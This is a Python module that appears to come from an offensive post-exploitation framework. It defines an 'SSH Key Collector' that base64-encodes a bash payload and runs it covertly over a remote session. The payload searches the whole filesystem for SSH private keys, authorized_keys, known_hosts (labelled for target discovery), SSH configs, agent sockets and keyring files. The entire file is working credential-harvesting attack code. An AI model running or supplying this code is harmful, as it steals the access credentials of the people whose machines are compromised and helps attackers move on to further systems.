"""SSH key collection script."""

from ..base import OperatorScript, ScriptResult


class SSHKeyCollector(OperatorScript):
    """Comprehensive SSH key collection."""
    
    name = "SSH Key Collector"
    description = "Collect SSH private keys, authorized_keys, and known_hosts"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SSH KEY COLLECTOR"
echo "===================="
echo ""

echo "[+] Searching for SSH private keys..."
for key_type in id_rsa id_dsa id_ecdsa id_ed25519; do
    find / -name "$key_type" 2>/dev/null | while read key; do
        echo "[!] Found: $key"
        ls -la "$key"
        echo "First line:"
        head -1 "$key" 2>/dev/null
        echo ""
    done
done

echo "[+] SSH public keys:"
find / -name "*.pub" -path "*/.ssh/*" 2>/dev/null | head -20
echo ""

echo "[+] SSH authorized_keys:"
find / -name "authorized_keys" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    wc -l "$file"
done
echo ""

echo "[+] SSH known_hosts (target discovery):"
find / -name "known_hosts" 2>/dev/null | while read file; do
    echo "[!] $file"
    cat "$file" 2>/dev/null | head -10
done
echo ""

echo "[+] SSH config files:"
find / -name "config" -path "*/.ssh/*" 2>/dev/null | while read file; do
    echo "[!] $file"
    cat "$file" 2>/dev/null
done
echo ""

echo "[+] SSH agent sockets:"
find /tmp /var/run -name "agent.*" 2>/dev/null
echo ""

echo "[+] Checking for GNOME Keyring SSH keys:"
find / -path "*/.local/share/keyrings/*" 2>/dev/null
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Collecting SSH keys...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="SSH key collection executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
